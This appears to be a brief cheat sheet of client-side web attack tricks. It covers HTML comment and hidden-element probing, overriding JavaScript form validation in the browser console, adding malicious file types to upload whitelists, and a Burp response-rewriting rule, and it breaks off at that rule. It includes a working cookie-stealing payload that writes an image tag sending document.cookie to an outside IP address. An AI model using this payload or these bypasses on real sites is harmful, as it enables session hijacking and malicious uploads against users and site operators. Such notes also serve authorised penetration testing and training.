# Client Side


## HTML Comment
- ```--!>```

## CSS Hidden Element
- ```display: none;```
- ```display: hidden;```

## Bypass JS Control
- ```function```
- Stealing Cookie
```Javascript
document.write('<img src="http://192.168.8.105/?' + document.cookie + '" />');
```
- Bypass validation with return true
  - Go to page source code
  - Find validation script and copy it 
    - search for ```onsubmit``` 
  - Enable pasting
    - Browser => Console => allow pasting
  - remove ```if clause``` part and paste
```Javascript
function webform_onsubmit () {
return true;
}

```
- Bypass uploading file type restriction
  - Find function of validate file types
    - In source code (javascript), search for error text of uploading wrong file 
  - Add malicious file type to whitelist of this function

## Burp
- Proxy > Options > Match and Replace > Add
  - Type: Response Body
  - Match: ```<!--```
  - Replace: 
